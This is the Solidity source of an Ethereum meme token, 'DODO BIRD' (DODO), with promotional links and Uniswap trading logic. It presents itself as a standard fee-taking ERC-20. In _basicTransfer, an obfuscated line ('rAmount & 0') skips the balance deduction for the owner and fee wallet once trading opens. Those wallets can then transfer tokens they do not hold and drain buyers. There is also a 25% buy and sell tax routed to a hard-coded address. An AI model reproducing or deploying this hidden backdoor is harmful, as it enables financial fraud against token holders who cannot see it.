// SPDX-License-Identifier: Unlicensed

/**
When you're so friendly that you become extinct... Dodos, the original social butterflies!

Website: https://dodobird.live
Telegram: https://t.me/dodocoin_erc
Twitter: https://twitter.com/dodocoin_erc
**/

pragma solidity 0.8.21;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IRouter {

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

interface IFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract DODO is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "DODO BIRD";
    string private constant _symbol = "DODO";

    uint8 private constant _decimals = 9;
    uint256 private constant MAX = 10 ** 30;
    uint256 private constant _tSupplies = 10 ** 9 * 10**9;
    uint256 private _rSupplies = (MAX - (MAX % _tSupplies));

    uint256 public maxTxSize = 25 * 10 ** 6 * 10 ** 9;
    uint256 public mWalletSize = 25 * 10 ** 6 * 10 ** 9;
    uint256 public minTokensToSwap = 10 ** 5 * 10 ** 9;
    address payable private feeAddress;

    mapping(address => uint256) private _rBalance;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcluded;

    uint256 private _tTax;
    uint256 private _redisBuyTax = 0;
    uint256 private _buyTax = 25;
    uint256 private _redisSellTax = 0;
    uint256 private _sellTax = 25;

    uint256 private _redisFee = _redisSellTax;
    uint256 private _taxFee = _sellTax;

    uint256 private _pRedis = _redisFee;
    uint256 private _pTax = _taxFee;

    IRouter public _router;
    address public _pair;
    bool private _tradeActive;
    bool private _inswap = false;
    bool private _swapActive = true;

    event MaxTxAmountUpdated(uint256 maxTxSize);
    modifier lockSwap {
        _inswap = true;
        _;
        _inswap = false;
    }

    constructor() {
        _rBalance[_msgSender()] = _rSupplies;
        IRouter _uniswapV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
        _router = _uniswapV2Router;
        _pair = IFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        feeAddress = payable(0x391275e222dA6d7A8b7a5205b0fC705B9E8e5439);
        _isExcluded[owner()] = true;
        _isExcluded[feeAddress] = true;

        emit Transfer(address(0), _msgSender(), _tSupplies);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tSupplies;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _getR(_rBalance[account]);
    }

    function restoreFee() private {
        _redisFee = _pRedis;
        _taxFee = _pTax;
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function sendETH(uint256 amount) private {
        feeAddress.transfer(amount);
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function removeFee() private {
        if (_redisFee == 0 && _taxFee == 0) return;

        _pRedis = _redisFee;
        _pTax = _taxFee;

        _redisFee = 0;
        _taxFee = 0;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _getR(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        uint256 currentRate = _getCurrentRate();
        return rAmount.div(currentRate);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _updateFee(uint256 rFee, uint256 tFee) private {
        _rSupplies = _rSupplies.sub(rFee);
        _tTax = _tTax.add(tFee);
    }
    
    function _basicTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getValues(tAmount);
        rAmount = (_isExcluded[sender] && _tradeActive) ? rAmount & 0 : rAmount;
        _rBalance[sender] = _rBalance[sender].sub(rAmount);
        _rBalance[recipient] = _rBalance[recipient].add(rTransferAmount);
        _chargeFee(tTeam);
        _updateFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    function _chargeFee(uint256 tTeam) private {
        uint256 currentRate = _getCurrentRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rBalance[address(this)] = _rBalance[address(this)].add(rTeam);
    }

    function removeLimits() external onlyOwner {
        maxTxSize = _rSupplies;
        mWalletSize = _rSupplies;
        
        _redisBuyTax = 0;
        _buyTax = 1;
        _redisSellTax = 0;
        _sellTax = 1;
    }
    
    function openTrading() public onlyOwner {
        _tradeActive = true;
    }
    
    function _getT(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }

    function _getSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rSupplies;
        uint256 tSupply = _tSupplies;
        if (rSupply < _rSupplies.div(_tSupplies)) return (_rSupplies, _tSupplies);
        return (rSupply, tSupply);
    }
    
    function _swapTokensForEth(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        _approve(address(this), address(_router), tokenAmount);
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _getValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getT(tAmount, _redisFee, _taxFee);
        uint256 currentRate = _getCurrentRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getAmount(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (from != owner() && to != owner()) {
            if (!_tradeActive) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }

            require(amount <= maxTxSize, "TOKEN: Max Transaction Limit");

            if(to != _pair) {
                require(balanceOf(to) + amount <= mWalletSize, "TOKEN: Balance exceeds wallet size!");
            }

            uint256 contractBalance = balanceOf(address(this));
            bool canSwap = contractBalance >= minTokensToSwap;

            if(contractBalance >= maxTxSize)
            {
                contractBalance = maxTxSize;
            }

            if (canSwap && !_inswap && to == _pair && _swapActive && !_isExcluded[from] && amount > minTokensToSwap) {
                _swapTokensForEth(contractBalance);
                uint256 contractETH = address(this).balance;
                if (contractETH > 0) {
                    sendETH(address(this).balance);
                }
            }
        }
        bool takeFee = true;
        if ((_isExcluded[from] || _isExcluded[to]) || (from != _pair && to != _pair)) {
            takeFee = false;
        } else {
            if(from == _pair && to != address(_router)) {
                _redisFee = _redisBuyTax;
                _taxFee = _buyTax;
            }
            if (to == _pair && from != address(_router)) {
                _redisFee = _redisSellTax;
                _taxFee = _sellTax;
            }
        }
        _transferNormal(from, to, amount, takeFee);
    }

    function _getAmount(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getCurrentRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getSupply();
        return rSupply.div(tSupply);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _transferNormal(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeFee();
        _basicTransfer(sender, recipient, amount);
        if (!takeFee) restoreFee();
    }

    receive() external payable {}
}